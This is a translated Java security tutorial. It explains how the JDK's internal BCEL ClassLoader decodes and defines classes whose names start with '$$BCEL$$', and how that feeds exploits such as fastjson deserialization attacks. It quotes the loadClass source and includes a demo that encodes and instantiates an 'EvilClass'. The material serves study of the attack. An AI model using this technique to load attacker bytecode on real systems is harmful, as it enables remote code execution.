BCEL` is full name `Apache Commons BCEL`, and is a subproject under the `Apache Commons` project. It is a tool library for analyzing, creating and manipulating `Java` class files. The BCEL library is referenced in the Oracle JDK, but the original package name `org.apache.bcel.util.ClassLoader` is modified to `com.sun.org`.apache.bcel.internal.util.ClassLoader`. The BCEL` class loader will specialize in the class name when parsing the class name. This feature is often used to write various attacks `exp`, such as exploiting in the `fastjson` vulnerability.

### Principle

The `com.sun.org``.apache.bcel.internal.util.ClassLoader` class has rewritten the loadClass method in `java.lang.ClassLoader` class. From the `loadClass` source code rewritten below, you can see that there is a judgment on whether the class name starts with `$$BCEL$`. If so, the `com.sun.org``.apache.bcel.internal.util.ClassLoader#createClass` method will be called to further trigger the `Utility#`*`decode`** method. *

```Java
protected Class loadClass(String class_name, boolean resolve)
  throws ClassNotFoundException
{
  Class cl = null;

  /* First try: lookup hash table.
   */
  if((cl=(Class)classes.get(class_name)) == null) {
    /* Second try: Load system class using system class loader. You better
     * don't mess around with them.
     */
    for(int i=0; i < ignored_packages.length; i++) {
      if(class_name.startsWith(ignored_packages[i])) {
        cl = deferTo.loadClass(class_name);
        break;
      }
    }

    if(cl == null) {
      JavaClass clazz = null;

      /* Third try: Special request?
       */
      if(class_name.indexOf("$BCEL$$") >= 0)
        clazz = createClass(class_name);
      else { // Fourth try: Load classes via repository
        if ((clazz = repository.loadClass(class_name)) != null) {
          clazz = modifyClass(clazz);
        }
        else
          throw new ClassNotFoundException(class_name);
      }

      if(clazz != null) {
        byte[] bytes = clazz.getBytes();
        cl = defineClass(class_name, bytes, 0, bytes.length);
      } else // Fourth try: Use default class loader
        cl = Class.forName(class_name);
    }

    if(resolve)
      resolveClass(cl);
  }

  classes.put(class_name, cl);

  return cl;
}
```

![img](https://o5szcykwgn.feishu.cn/space
/api/box/stream/download/asynccode/?code=YTY2M2E1ZmE2NWY2MjM4YWNkNjVlODBlNGUwOGFlNmJfMzBrMVpEdDBGelUxUDRtQWQzUVBEN2t3NXhTc3ZtVDFfVG9rZW46Ym94Y25tVEdieWF3cm1ONTcyQkZXdGlzS1hmXzE2NjU5ODY3ODc6MTY2NTk5MDM4N19WNA)

In the sample code, the Java Class is converted into native bytecode format using the `Repository#lookupClass` method, and then the native bytecode is converted into `BCEL` format bytecode, and finally the `com.sun.org``.apache.bcel.internal.util.ClassLoader#loadClass` is called and instantiated.

```Java
package com.security;

import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.util.ClassLoader;

import java.io.IOException;
import java.util.Arrays;

public class BCELClassLoaderDemo {

    public static void main(String[] args) throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException {

        JavaClass clazz = Repository.lookupClass(EvilClass.class);
        String code = Utility.encode(clazz.getBytes(), true);

        new ClassLoader().loadClass("$$BCEL$$" + code).newInstance();
    }
}
```

![img](https://o5szcykwgn.feishu.cn/space/api/box/stream/download/asynccode/?code=MTNkOGIwZGIxYzAyY2VhOWQ0NWFmZTI5ODE3ZDkzMWFfREI2bGpEVWhVWFFnYVNCckFpR1pUYTRJbWlpZElNUzFfVG9rZW46Ym94Y25tMkpSMW1GZW55cktrUmxvVU16RGliXzE2NjU5ODY3ODc6MTY2NTk5MDM4N19WNA)

It should be noted that in the `8u251` and later JDK versions, the `com.sun.org``.apache.bcel.internal.util.ClassLoader` class was removed.

# refer to

- [ClassLoader (class loading mechanism)](https://javasec.org/javase/ClassLoader/)

- [Where did BCEL ClassLoader go](https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html)

- Java Security Talk - 13. What methods to dynamically load bytecode in Java